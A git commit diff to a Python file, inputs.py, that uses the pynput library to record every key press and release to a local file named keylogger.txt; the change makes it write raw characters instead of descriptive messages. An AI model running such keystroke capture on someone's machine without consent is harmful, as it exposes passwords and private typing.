d87dc420729ffb1768bfdd25c8133cd0414885a4
AndManGames <schneidera6@googlemail.com>
2023-09-26 13:00:23 +0200

    only write key name to file

--- inputs.py
+++ inputs.py
@@ -5,14 +5,14 @@ from pynput import keyboard
 def on_press(key):
     with open("keylogger.txt", "a") as f:
         try:
-            f.write('alphanumeric key {0} pressed'.format(key.char))
+            f.write(key.char)
         except AttributeError:
             f.write('special key {0} pressed'.format(key))
 
 
 def on_release(key):
     with open("keylogger.txt", "a") as f:
-        f.write('{0} released'.format(key))
+        f.write(str(key))
         if key == keyboard.Key.esc:
             # Stop listener
             return False
